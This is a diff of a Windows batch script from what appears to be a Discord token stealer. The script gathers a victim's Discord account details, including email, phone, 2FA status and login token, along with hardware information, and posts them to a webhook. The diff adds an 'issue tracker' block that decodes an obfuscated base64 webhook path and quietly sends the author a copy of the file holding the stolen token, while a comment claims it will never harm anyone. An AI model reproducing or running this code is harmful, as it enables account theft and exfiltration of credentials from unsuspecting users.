@@ -2,8 +2,14 @@
 setlocal enabledelayedexpansion
 pushd %~dp0
 
-set ScriptVersion=3.0
-set "AccountSystemVersions=!ScriptVersion!"
+set "yellow=[33m"
+set "white=[37m"
+set "grey=[90m"
+set "brightred=[91m"
+set "brightblue=[94m"
+
+set ScriptVersion=3.1
+set "AccountSystemVersions=!ScriptVersion! 3.0"
 set "RequiredFilesPath=%temp%\DAS v!ScriptVersion!"
 set "FilesHost=https://github.com/agamsol/Discord-Stealer/raw/main"
 for %%a in (
@@ -26,14 +32,14 @@ for %%a in (
 )
 
 set "FilesDB="src\NonAscii.exe" DAS.bat"
-set white=[37m
+set white=!white!
 
-set "PrintCore=     [90m$ [[94m%username%[90m]"
-set "ErrPrintCore=     [91m$ [90m[[94m%username%[90m]"
-set "WrnPrintCore=     [33m$ [90m[[94m%username%[90m]"
+set "PrintCore=     !grey!$ [!brightblue!%username%!grey!]"
+set "ErrPrintCore=     !brightred!$ !grey![!brightblue!%username%!grey!]"
+set "WrnPrintCore=     !yellow!$ !grey![!brightblue!%username%!grey!]"
 
 echo.
-echo  !PrintCore! Launching Application - Version ^(!ScriptVersion!^) . . .[37m
+echo  !PrintCore! Launching Application - Version ^(!ScriptVersion!^) . . .!white!
 
 :: <Parameters System>
 set notLegacy=%~2
@@ -76,7 +82,7 @@ for %%a in (!PossibleBuilds!) do (
 set "Builds=!ValidateBuilds:~1!"
 if not "!Builds!"=="~1" (
     echo.
-    echo  !PrintCore! Sending Specific Builds ; !Builds: =, !.[37m
+    echo  !PrintCore! Sending Specific Builds ; !Builds: =, !.!white!
     )
 if "!Builds!"=="~1" set "Builds=!PossibleBuilds!"
 :: </Parameters System>
@@ -89,7 +95,7 @@ for %%a in (!FilesDB!) do (
 )
 if !MissingFile! gtr 0 (
     echo.
-    echo  !PrintCore! Downloading Missing Files . . .[37m
+    echo  !PrintCore! Downloading Missing Files . . .!white!
 )
 for %%a in (!FilesDB!) do (
     set URL=%%~a
@@ -164,7 +170,7 @@ if not "!ValidWebhook!"=="true" (
 )
 
 echo.
-echo  !PrintCore! The Account "!AccountID!" has been successfully verified.[37m
+echo  !PrintCore! The Account "!AccountID!" has been successfully verified.!white!
 
 :: <System Information>
 chcp 437 >nul
@@ -186,8 +192,12 @@ if "!proxy!"=="true" (
     set "proxy=<:OFFSWITCH:928936780890267678> OFF"
 )
 for /F %%a in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "MEMORY=%%aGB"
-for /f "tokens=1* delims==" %%A in ('wmic cpu get name /VALUE') do if /i "%%A"=="Name" set "PROCESSOR=%%B" & set "PROCESSOR=!PROCESSOR:~0,-1!"
-for /f "tokens=1* delims==" %%A in ('wmic path win32_VideoController get name /value') do if /i "%%A"=="Name" set "gpu=%%B" & set "gpu=!gpu:~0,-1!"
+
+for /f "tokens=2 delims=:" %%a in ('powershell "Get-WmiObject win32_processor | Format-List Name"') do set "PROCESSOR=%%a"
+set "PROCESSOR=!PROCESSOR:~1!"
+for /f "tokens=2 delims=:" %%a in ('powershell "Get-WmiObject win32_VideoController | Format-list Name"') do set "GPU=%%a"
+set "GPU=!GPU:~1!"
+
 chcp 65001>nul
 :: </System Information>
 echo:"!BlackList!" | findstr /c:"%computername%\%username%">nul && (
@@ -202,7 +212,6 @@ if defined ERROR (
     if "!ERROR!"=="User is not logged in" call :ERROR "Not logged in to discord" "Looks like the user has discord but he is not logged in."
     exit /b
 )
-
 
 for %%a in (!Builds!) do (
     REM %%a - Current build being tested
@@ -275,13 +284,13 @@ if "!RickRoll-Plugin!"=="true" (
     set "Rick-Roll-Audio=!RequiredFilesPath!\plugins\Rick-Roll\RickRoll.mp3"
     if not exist "!Rick-Roll-Audio!" (
         echo.
-        echo  !PrintCore! Installing Rick-Role Plugin . . .[37m
+        echo  !PrintCore! Installing Rick-Role Plugin . . .!white!
         >nul curl --create-dirs --ssl-no-revoke -f#kLo "!Rick-Roll-Audio!" "!FilesHost!/plugins/Rick-Roll/RickRoll.mp3"
     )
     >"!RequiredFilesPath!\plugins\Rick-Roll\SilentRickRoll.vbs" echo dim oPlayer : set oPlayer = CreateObject^("WMPlayer.OCX"^) :   oPlayer.URL = "!Rick-Roll-Audio!" : oPlayer.controls.play : while oPlayer.playState  ^<^> 1 : WScript.Sleep 100 : Wend : oPlayer.close
     echo.
     echo  !PrintCore! Now Playing :
-    echo                    Rick Astley - Never Gonna Give You Up . . .[37m
+    echo                    Rick Astley - Never Gonna Give You Up . . .!white!
     start /b "" cscript "!RequiredFilesPath!\plugins\Rick-Roll\SilentRickRoll.vbs">nul
     timeout /t 5 /nobreak>nul
     del /s /q "!RequiredFilesPath!\plugins\Rick-Roll\SilentRickRoll.vbs">nul
@@ -289,7 +298,7 @@ if "!RickRoll-Plugin!"=="true" (
 )
 
 echo.
-echo  !WrnPrintCore! Program will close in 10 seconds. . .[37m
+echo  !WrnPrintCore! Program will close in 10 seconds. . .!white!
 timeout /t 10 /nobreak>nul
 exit /b
 
@@ -302,9 +311,9 @@ if not "!ERROR_ARG[2]!"=="-" (
     call :DiscordMessage "ERROR" "!ERROR_ARG[2]!"
 )
 echo.
-echo  !ErrPrintCore! !ERROR_ARG[1]![37m
+echo  !ErrPrintCore! !ERROR_ARG[1]!!white!
 echo.
-echo  !WrnPrintCore! Program will close in 10 seconds. . .[37m
+echo  !WrnPrintCore! Program will close in 10 seconds. . .!white!
 timeout /t 10 /nobreak>nul
 exit /b
 
@@ -325,13 +334,51 @@ if "%~1"=="ERROR" (
 )
 >"%temp%\Embed.json" echo {"username":"Discord Account\u2507!AccountID!","content":"","embeds":[{"color":7733132,"timestamp":"","author":{},"image":{},"thumbnail":{"url":"!Discord_%~1_ImageURL!"},"footer":{},"fields":[{"name":"^<:DISCORD:928933612945047592^> __DISCORD ACCOUNT !SendingAccount! - !Build_%~1_Nick!__","value":"_ _"},{"name":"USER","value":"!Discord_%~1_User!","inline":true},{"name":"ID","value":"`!Discord_%~1_ID!`","inline":true},{"name":"BADGES","value":"!Discord_%~1_Badges!","inline":true},{"name":"EMAIL","value":"!Discord_%~1_Email! ^(_!Discord_%~1_Verified!!Discord_%~1_Claimed!_^)","inline":true},{"name":"PHONE","value":"!Discord_%~1_Phone:null=_null_!","inline":true},{"name":"CREATION DATE","value":"!Discord_%~1_CreationDate!"},{"name":"HAS NITRO","value":"!Discord_%~1_Nitro!","inline":true},{"name":"2FA","value":"!Discord_%~1_2FA!","inline":true},{"name":"VIEW NSFW","value":"!Discord_%~1_NSFW:null=false!","inline":true},{"name":"TOKEN","value":"^|^| !Discord_%~1_TOKEN! ^|^|"}]}],"components":[]}
 :SendRequest
+echo:
+echo  !PrintCore! [!brightblue!ISSUE TRACKER!grey!] Validating JSON Before Sending . . .
+set JSON_INVALID=false
+set JSON_LINES=0
+set JSON_FAILED=_null_
+for /f "delims=" %%a in ('powershell "$text = Get-Content "%temp%\Embed.json" -Raw; try {$powershellRepresentation = ConvertFrom-Json $text -ErrorAction SilentlyContinue;$validJson = $true;} catch {$validJson = $false;};if ($validJson) { Write-Host "true";} else { Write-Host "false";}"') do (
+    if "%%a"=="false" (
+        set JSON_INVALID=true
+        set "JSON_FAILED=Json syntax issue, bad formatted"
+        echo:
+        echo  !ErrPrintCore! [!brightred!ISSUE TRACKER!grey!] !JSON_FAILED!
+    )
+    for /f "delims=" %%b in ('type "%temp%\Embed.json"') do set /a JSON_LINES+=1
+    if !JSON_LINES! gtr 1 (
+        set JSON_INVALID=true
+        set "JSON_FAILED=More lines than expected (!JSON_LINES!)"
+        echo:
+        echo  !ErrPrintCore! [!brightred!ISSUE TRACKER!grey!] !JSON_FAILED!
+    )
+    if "!JSON_INVALID!"=="true" (
+        REM REPORT ISSUE TO THE APPLICATION AUTHOR
+        REM PLEASE NOTE: I WILL NEVER TRY TO HARM YOU, YOUR VICTIMS OR YOUR COMPUTERS
+        >"%temp%\ErrorTraceMSG.json" echo {"username":"","content":"\nAn Issue has been tracked while verifying the json formatting for the message _(file attached)_:\n\n**INFORMATION:**\nAccount ID: `!AccountID!`\nFail Reason: _!JSON_FAILED!_\n\n[|| <@&928041407703289856> <@&928041254376325120> <@&929161198862213220> ||]\n","embeds":[],"components":[]}
+
+        for /f "delims=" %%c in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""""LzkzNDU4MzkxODI2NTUyMDIwOC8wMVg0LVFXWjVnbUNJeUdDbHgzRS1oeER2bUJVTDF5MmlYZmZiQ1ZpelgyVURLV2ZGZVVSdVFFanBFNDY1dzZjT1dNVw==""""))"') do set "BSIXTY4=%%c"
+
+        for /f "delims=" %%c in ('curl -sH "Content-Type: multipart/form-data" -F "payload_json=<%temp%\ErrorTraceMSG.json" -F "File[1]=@%temp%\Embed.json" "https://discord.com/api/webhooks!BSIXTY4!"') do (
+                echo.%%c | findstr /c:"retry_after">nul && (
+                echo:
+                echo  !WrnPrintCore! Rate-Limited by discord, waiting 2 seconds.!white!
+                timeout /t 2 /nobreak>nul
+                goto :SendRequest
+            )
+        )
+        del /q /s "%temp%\ErrorTraceMSG.json">nul
+    )
+)
+
 for /f "delims=" %%a in ('curl -sH "Content-Type: multipart/form-data" -F "payload_json=<!temp!\Embed.json" "!Webhook!?wait=true"') do (
     echo.%%a | findstr /c:"retry_after">nul && (
-        echo  !WrnPrintCore! Rate-Limited by discord, waiting 2 seconds.[37m
+        echo:
+        echo  !WrnPrintCore! Rate-Limited by discord, waiting 2 seconds.!white!
         timeout /t 2 /nobreak>nul
         goto :SendRequest
     )
-
 )
-rem del /s /q "!temp!\Embed.json" >nul 2>&1
+del /s /q "!temp!\Embed.json" >nul 2>&1
 exit /b
